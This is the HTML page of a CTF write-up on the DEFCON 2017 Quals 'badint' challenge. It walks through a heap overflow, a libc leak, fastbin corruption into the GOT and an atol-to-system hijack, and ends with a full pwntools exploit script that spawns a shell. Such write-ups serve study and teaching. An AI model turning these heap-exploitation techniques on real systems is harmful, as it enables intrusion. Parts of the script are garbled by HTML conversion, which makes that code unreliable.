@@ -1,0 +1,754 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>DEFCON CTF 2017 Quals – badint - Hacking Tube 2.0</title>
+<meta name="description" content="Category: Potent Pwnables">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="DEFCON CTF 2017 Quals – badint">
+<meta property="og:url" content="http://0.0.0.0:4000/1784522/">
+
+
+  <meta property="og:description" content="Category: Potent Pwnables">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2017-05-02T22:59:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/1784522/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="DEFCON CTF 2017 Quals – badint">
+    <meta itemprop="description" content="Category: Potent Pwnables">
+    <meta itemprop="datePublished" content="May 02, 2017">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON CTF 2017 Quals – badint
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Potent Pwnables</p>
+
+<p>64 bit ELF, Partial RELRO, NX enabled, No canary &amp; PIE. <strong>libc not provided</strong>.</p>
+
+<!-- more -->
+
+<p>This C++ program will read some input from user, then store the data into the heap memory:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
+SEQ #: 0
+Offset: 0
+Data: AAAAAAA
+LSF Yes/No: Yes
+RX PDU [0] [len=4]
+Assembled [seq: 0]: aaaaaa0a
+
+SEQ #: 
+</code></pre></div></div>
+<p>Notice that if we input data <code class="highlighter-rouge">AAAA</code>, the program will convert <code class="highlighter-rouge">AAAA</code> to <code class="highlighter-rouge">0xaaaa</code>.</p>
+
+<p>According to my teammate, the following input will crash the program:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEQ #: 1
+Offset: 0
+Data: 0000000000000000000000000000000000000000000000000000000000000
+LSF Yes/No: Yes
+RX PDU [1] [len=31]
+Assembled [seq: 1]: 00000000000000000000000000000000000000000000000000000000000000
+
+SEQ #: 1
+Offset: 0
+Data: 111111111111111111111111111111111111111
+LSF Yes/No: Yes
+RX PDU [1] [len=20]
+Assembled [seq: 1]: 1111111111111111111111111111111111111101
+
+SEQ #: 1
+Offset: 18
+Data: 22222222222222222222222
+LSF Yes/No: Yes
+RX PDU [1] [len=12]
+Assembled [seq: 1]: 000000000000000022222202
+
+*** Error in `./badint': free(): invalid next size (fast): 0x000000000224a0c0 ***
+</code></pre></div></div>
+
+<p>After done some analyzing, we found the vulnerability:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">get_len</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
+ <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">get_data</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
+ <span class="n">offset</span> <span class="o">=</span> <span class="n">get_offset</span><span class="p">(</span><span class="n">cur_obj</span><span class="p">);</span>
+ <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">new_buf</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span> <span class="c1">// &lt;-- Here !!
+</span></code></pre></div></div>
+
+<p>The program use <code class="highlighter-rouge">memcpy(new_buf + offset, data, len)</code> to copy the input data into a heap buffer. The variable <code class="highlighter-rouge">offet</code> can be controlled by us, and thus lead to a <strong>heap overflow vulnerability</strong>. The program crashed due to the <code class="highlighter-rouge">size</code> metadata was overwritten into an invalid size, causing the <code class="highlighter-rouge">free()</code> function aborted the program.</p>
+
+<p>Now we spot the vulnerability, time to exploit the service. First we’ll have to leak some address. Here I leaked the libc’s address by doing the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./badint 
+SEQ #: 1
+Offset: 8
+Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+LSF Yes/No: Yes
+RX PDU [1] [len=144]
+Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+SEQ #:
+</code></pre></div></div>
+
+<p>Here we set the offset to 8, so the data we input will copy to <code class="highlighter-rouge">heap_buf+8</code>. <code class="highlighter-rouge">heap_buf</code> is a chunk in unsortbin which will be allocated for storing our input data, and thus its <code class="highlighter-rouge">fd</code> &amp; <code class="highlighter-rouge">bk</code> will contain the address of <code class="highlighter-rouge">main_arena+88</code>. We copy the data to <code class="highlighter-rouge">heap_buf+8</code>, means that <code class="highlighter-rouge">fd</code> will not be overwritten, and so we could leak the libc’s address by printing out the assembled data.</p>
+
+<p>The next step is to try hijack the program control flow. Here I decided to use the fastbin corruption attack. First we’ll have to arrange the following heap memory layout:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0xc26cc0 --&gt; 0x0
+(0x40)     fastbin[2]: 0xc26c80 --&gt; 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0xc26c20 --&gt; 0x0   
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0xc26f10 (size : 0x1c0f0) 
+       last_remainder: 0xc26e00 (size : 0x50) 
+            unsortbin: 0x0
+gdb-peda$ 
+</code></pre></div></div>
+
+<p>By using the amazing <a href="https://github.com/scwuaptx/Pwngdb/tree/master/angelheap">angelheap</a> from <a href="https://github.com/scwuaptx/Pwngdb">Pwngdb</a>, we could see that there’s a chunk in <code class="highlighter-rouge">fastbin[4]</code>(size = 0x60), and a chunk in <code class="highlighter-rouge">fastbin[2]</code>(size = 0x40).</p>
+
+<p>Then, we allocate the chunk in <code class="highlighter-rouge">fastbin[4]</code>, and copy our data into the chunk. Since there’s a heap overflow vulnerability, we can actually overwrite the data in chunk @ <code class="highlighter-rouge">fastbin[2]</code> – by setting the <code class="highlighter-rouge">offet</code> variable to <code class="highlighter-rouge">0x60</code> ( <code class="highlighter-rouge">0xc26c20</code> + <code class="highlighter-rouge">0x60</code> = <code class="highlighter-rouge">0xc26c80</code> ). We overwrite the <code class="highlighter-rouge">fd</code> pointer in chunk @ <code class="highlighter-rouge">fastbin[2]</code>, making it point to the GOT area. This is because in an x64 non-PIE binary, its GOT entries will contain some address which start with <code class="highlighter-rouge">0x40</code> (if the function hasn’t been resolved yet):</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x604018
+00:0000|  0x604018 --&gt; 0x7fbdea10c800 (&lt;__printf&gt;:      sub    rsp,0xd8)
+-------------------------------------------------------------------------
+01:0008|  0x604020 --&gt; 0x400ab6 (&lt;__gmon_start__@plt+6&gt;:        push   0x1)
+-------------------------------------------------------------------------
+02:0016|  0x604028 --&gt; 0x7fbdea126690 (&lt;_IO_puts&gt;:      push   r12)
+03:0024|  0x604030 --&gt; 0x7fbdea723f10 (&lt;operator new[](unsigned long)&gt;: sub    rsp,0x8)
+04:0032|  0x604038 --&gt; 0x7fbdea721f10 (&lt;operator delete(void*)&gt;:        jmp    0x7fbdea71ddb0 &lt;free@plt&gt;)
+05:0040|  0x604040 --&gt; 0x7fbdea126e70 (&lt;__GI__IO_setvbuf&gt;:      push   rbp)
+-------------------------------------------------------------------------
+06:0048|  0x604048 --&gt; 0x400b06 (&lt;fopen@plt+6&gt;: push   0x6)
+-------------------------------------------------------------------------
+07:0056|  0x604050 --&gt; 0x7fbdea0d7740 (&lt;__libc_start_main&gt;:     push   r14)
+</code></pre></div></div>
+<p>If we off-set the memory layout in the GOT area, we could found that it actually has some good <code class="highlighter-rouge">fastbin[2]</code>(again, size = 0x40) chunks:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x604042 &lt;setvbuf@got.plt+2&gt;:   0x0b0600007fbdea12      0x7740000000000040  &lt;-- here
+0x604052 &lt;__libc_start_main@got.plt+2&gt;: 0x4ad000007fbdea0d      0x1b7000007fbdea12
+0x604062 &lt;strlen@got.plt+2&gt;:    0xdea000007fbdea14      0xc3c000007fbdea0e
+0x604072 &lt;signal@got.plt+2&gt;:    0x0b6600007fbdea0e      0x2650000000000040 &lt;-- here
+0x604082 &lt;alarm@got.plt+2&gt;:     0x0b8600007fbdea18      0x0b96000000000040 &lt;-- here
+0x604092 &lt;dlsym@got.plt+2&gt;:     0x0ba6000000000040      0x0bb6000000000040 &lt;-- and here !
+</code></pre></div></div>
+<p>While allocating a fastbin chunk, <strong>malloc.c will only check if its size is valid</strong>. For example, a chunk in <code class="highlighter-rouge">fastbin[2]</code> must have a size of <code class="highlighter-rouge">0x4X</code> ( yep, even a size of <code class="highlighter-rouge">0x4f</code> will still pass the check). So, after we overwrite the <code class="highlighter-rouge">fd</code> pointer in the chunk @ <code class="highlighter-rouge">fastbin[2]</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ hip
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x1da3cc0 --&gt; 0x0
+(0x40)     fastbin[2]: 0x1da3c80 --&gt; 0x604042 (size error (0xc740000000000040)) --&gt; 0x9ad000007f5e059a (invaild memory)
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x1da3c20 --&gt; 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x1da3f80 (size : 0x1c080) 
+       last_remainder: 0x1da3e00 (size : 0x50) 
+            unsortbin: 0x0
+gdb-peda$
+</code></pre></div></div>
+<p>We could see that <code class="highlighter-rouge">fastbin[2]</code> will have a fake chunk @ <code class="highlighter-rouge">0x604042</code> ( no need to worry about the size, <strong>malloc.c</strong> will only check the size with type <code class="highlighter-rouge">unsigned int</code> , just focus on the first 4 bytes ).</p>
+
+<p>Later we could just allocate the chunk in <code class="highlighter-rouge">fastbin[2]</code>. Once we allocate <code class="highlighter-rouge">0x604042</code>, we’ll be able to overwrite the GOT entry by copying our data into the fake fastbin chunk.</p>
+
+<p>But there’s one more problem: we don’t know the version of the libc. The libc address we leaked is the address of <code class="highlighter-rouge">main_arena+88</code>, neither <a href="https://github.com/niklasb/libc-database">libc-database</a> nor <a href="http://libcdb.com/">libcdb.com</a> can find the libc version with this symbol’s address.</p>
+
+<p>So we’ll have to leak more addresses. However, although we can modify a function’s GOT, there’s no way we can store a GOT entry’s address in the function parameter. Luckily, I still managed to figure out the solution: <strong>by using the format string vulnerability.</strong></p>
+
+<p>We could modify <code class="highlighter-rouge">atol@got.plt</code> into <code class="highlighter-rouge">printf@got.plt</code>, which will turn <code class="highlighter-rouge">atol(our_input)</code> into <code class="highlighter-rouge">printf(our_input)</code>, <strong>thus we create a format string vulnerability, and we can use the vulnerability to leak an arbitrary address.</strong> By doing this, I was able to leak some GOT entries and found the correct version of libc at <a href="http://libcdb.com/">libcdb.com</a>. After that is simple, we could just hijack <code class="highlighter-rouge">atol</code>’s GOT and call <code class="highlighter-rouge">system('sh')</code> by entering “sh”.</p>
+
+<p>```python exp_bad.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me”
+PORT = 21813
+ELF_PATH = “./badint”
+#LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”
+LIBC_PATH = “./libc-2.19_15.so”</p>
+
+<p>context.binary = ELF_PATH
+context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
+context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+
+<p>elf = context.binary # context.binary is an ELF object
+libc = ELF(LIBC_PATH)</p>
+
+<p>def add_data(seq, off, data, lsf):
+    r.sendlineafter(“SEQ #:”, str(seq))
+    r.sendlineafter(“Offset: “, str(off))
+    r.sendlineafter(“Data: “, data)
+    r.sendlineafter(“Yes/No: “, lsf)</p>
+
+<p>def convert(num):
+    ret = “”
+    while num != 0:
+        now = num &amp; 0xff
+        num »= 8
+        ret = ret + ‘‘.format(now)
+    return ret.ljust(16, “0”)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+
+add_data(1, 8, "1"*0x90*2, 'Yes')
+r.recvuntil("Assembled [seq: 1]: ")
+# leak libc address
+addr = 0
+for i in xrange(6):
+    addr |= ((int(r.recv(2), 16)) &lt;&lt; (i*8))
+
+log.success("addr: " +hex(addr))
+# libc.address = addr - 0x3c3b78 # local
+libc.address = addr - 0x3be7b8 # remote
+log.success("libc_base: " +hex(libc.address))
+# gdb.attach(r, gdbscript=open('./ggg', 'r'))
+# arrange heap
+add_data(2, 0, "2"*0xb0*2, 'Yes')
+add_data(2, 0, "3"*0x58*2, 'Yes')
+add_data(2, 0, "4"*0x38*2, 'Yes')
+# overwrite fastbin-&gt;fd ( in size 0x40 )
+payload = convert(0x41)
+payload += convert(0x604042)
+payload += convert(0) * 6
+payload += convert(0x31)
+payload = payload.ljust(0x58*2, '0')
+add_data(2, 0x60-0x8, payload, 'Yes')
+# now fastbin (size=0x40) has fake chunk @ got
+# allocate the fake chunk
+# overwrite got
+payload = "6"*12 # libc_start_main
+payload += convert(0x400b26) # resolve fgets
+payload += convert(0x400b36) # resolve strlen
+payload += convert(libc.symbols['system']) # hijack atol
+#payload += convert(elf.plt['printf']) # use format string to leak libc info
+payload = payload.ljust(110, '0')
+add_data(3, 8, payload, 'No')
+
+# hijack atol, send "sh" to get shell
+r.sendlineafter("SEQ #:", "sh")
+log.success("get shell!: ")
+r.interactive()
+
+# for exploiting format string &amp; leak libc info
+"""
+payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['fgets'])
+r.sendlineafter("SEQ #:", payload)
+r.recv(1)
+print "fgets:", hex(u64(r.recv(6).ljust(8, '\x00')))
+payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['puts'])
+r.sendlineafter("Offset:", payload)
+r.recv(1)
+print "puts:", hex(u64(r.recv(6).ljust(8, '\x00')))
+""" ```
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">All ints are not the same... A239... Some can be bad ints!</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cpp" class="page__taxonomy-item" rel="tag">CPP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#defcon" class="page__taxonomy-item" rel="tag">DEFCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap-overflow" class="page__taxonomy-item" rel="tag">heap_overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2017-05-02T22:59:00+08:00">May 02, 2017</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=DEFCON+CTF+2017+Quals+--+badint%20http%3A%2F%2F0.0.0.0%3A4000%2F1784522%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F1784522%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2F1784522%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/1784510/" class="pagination--pager" title="DEFCON CTF 2017 Quals – peROPdo
+">Previous</a>
+    
+    
+      <a href="/Migrate-to-Github-Pages/" class="pagination--pager" title="Migrate to Github Pages
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/1784522/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/1784522"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
